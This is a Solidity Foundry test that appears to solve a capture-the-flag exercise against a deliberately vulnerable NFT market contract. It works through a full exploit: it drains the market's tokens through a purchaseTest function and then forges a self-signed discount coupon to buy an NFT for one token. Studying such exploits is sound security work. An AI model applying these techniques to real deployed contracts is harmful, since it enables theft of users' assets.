// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "@forge-std/Test.sol";
import "../src/VulnerableMarket.sol";
import "../src/AttackerNFT.sol";

contract MarketAttackTest is Test {
    VulnerableMarket market;
    address attacker;
    uint attackerPrivateKey;

    function setUp() public {
        market = new VulnerableMarket();
        attackerPrivateKey = 123456789;
        attacker = vm.addr(attackerPrivateKey);

    }

    function testAttackMarket() public {
        vm.startPrank(attacker);
        
        // 1. Get ERC20 tokens
        ThreeSigmaToken token = market.tsToken();
        token.airdrop();
        //Orders [Order(1),Order(2),Order(3)]

         // 2. Create attacker NFT
        AttackerNFT aNFT = new AttackerNFT();
        aNFT.mint(attacker,1); // mint aNFT 1
        aNFT.mint(attacker,2); // mint aNFT 1
        market.createOrder(address(aNFT),2,1);
        //Orders: [Order(1),Order(2),Order(3),Order(aNFT -2)]


        // 3. Purchase first NFT
        token.approve(address(market),type(uint).max);
        market.purchaseOrder(0);
        //Orders [Order(3),Order(2)]

        // 4. Call purchaseTest for the market to purchase our token
        aNFT.setApprovalForAll(address(market),true);
        market.purchaseTest(address(aNFT), 1, 1337); // Get all erc20 tokens from the market
        console.log(attacker.balance);
         //Orders [Order(3),Order(2)]

        // 5. Use 1337 TST to purchase NFT 2
        market.purchaseOrder(1);
        //Orders [Order(3)]

        // 6. Create Signed Cupon
        Coupon memory coupon;
        Signature memory signature;
        SignedCoupon memory scoupon;
        Order memory order;
        coupon.orderId = 0;
        coupon.newprice = 1;
        coupon.issuer = attacker;
        coupon.user = attacker;
        coupon.reason = "None";
        order = market.getOrder(0);
        bytes memory serialized = abi.encode(
            "I, the issuer",
            coupon.issuer,
            "offer a special discount for",
            coupon.user,
            "to buy",
            order,
            "at",
            coupon.newprice,
            "because",
            coupon.reason
        );
        (signature.v, signature.rs[0],signature.rs[1]) = vm.sign(attackerPrivateKey,keccak256(serialized));
        scoupon.coupon = coupon;
        scoupon.signature = signature;

        // 7. Call purchaseWithCoupon
        market.purchaseWithCoupon(scoupon);
        

        ThreeSigmaNFT tsNFT = market.tsNFT();

        console.log("Owner of 1 :",tsNFT.ownerOf(1));
        console.log("Owner of 2 :",tsNFT.ownerOf(2));
        console.log("Owner of 3 :",tsNFT.ownerOf(3));


        vm.stopPrank();
    }
    


}